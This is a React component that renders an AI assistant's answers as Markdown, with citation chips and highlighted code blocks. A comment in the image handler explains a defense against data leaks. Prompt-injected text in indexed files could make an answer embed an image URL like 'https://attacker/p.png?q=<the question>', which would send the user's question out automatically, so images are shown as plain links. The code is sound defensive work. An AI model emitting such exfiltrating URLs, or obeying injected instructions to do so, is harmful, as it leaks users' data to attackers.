"use client";

import { type ComponentProps, isValidElement, type ReactElement, type ReactNode, useMemo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

import { CodeView } from "@/components/code-view";
import { CHIP_PREFIX, type Chip, withChips } from "@/lib/answer";
import type { CitationCheck } from "@/lib/citations";
import { langFromFence } from "@/lib/highlight";

import { CitationChip } from "./citation-chip";

function codeChild(children: ReactNode): { lang: string; code: string } | null {
  const child = Array.isArray(children) ? children[0] : children;
  if (!isValidElement(child)) return null;
  const props = (child as ReactElement<{ className?: string; children?: ReactNode }>).props;
  const lang = /language-([\w+-]+)/.exec(props.className ?? "")?.[1];
  return { lang: langFromFence(lang), code: String(props.children ?? "") };
}

interface AnswerMarkdownProps {
  text: string;
  citations: CitationCheck[] | null;
  onOpenCitation: (chip: Chip) => void;
  streaming?: boolean; // code blocks are coloured once the answer is complete
}

/** The answer as Markdown (raw HTML is not rendered), with citation markers shown as chips. */
export function AnswerMarkdown({ text, citations, onOpenCitation, streaming = false }: AnswerMarkdownProps) {
  const { markdown, chips } = useMemo(() => withChips(text, citations), [text, citations]);
  const components = useMemo<Components>(
    () => ({
      a({ href, children, ...rest }: ComponentProps<"a">) {
        if (href?.startsWith(CHIP_PREFIX)) {
          const chip = chips[Number(href.slice(CHIP_PREFIX.length)) - 1];
          if (chip) return <CitationChip chip={chip} onOpen={onOpenCitation} />;
        }
        return (
          <a href={href} target="_blank" rel="noreferrer noopener" {...rest}>
            {children}
          </a>
        );
      },
      // Never render images. Answers can be steered by text inside indexed files (prompt
      // injection), and an <img> loads as soon as it appears, so a URL like
      // https://attacker/p.png?q=<the question> would leak data without a click. Show a plain
      // link instead: visible, and only fetched if the visitor chooses to open it.
      img({ src, alt }) {
        const href = typeof src === "string" ? src : undefined;
        return (
          <a href={href} target="_blank" rel="noreferrer noopener" className="text-muted-foreground">
            [image: {alt || "untitled"}]
          </a>
        );
      },
      pre({ children }) {
        const block = codeChild(children);
        return block ? (
          <CodeView code={block.code} lang={block.lang} highlight={!streaming} className="not-prose my-3" />
        ) : (
          <pre>{children}</pre>
        );
      },
    }),
    [chips, onOpenCitation, streaming],
  );
  return (
    <div className="prose prose-sm dark:prose-invert prose-pre:p-0 prose-code:before:content-none prose-code:after:content-none prose-code:rounded prose-code:bg-muted prose-code:px-1 prose-code:py-0.5 prose-code:font-normal max-w-none break-words [&_p]:leading-relaxed">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {markdown}
      </ReactMarkdown>
    </div>
  );
}
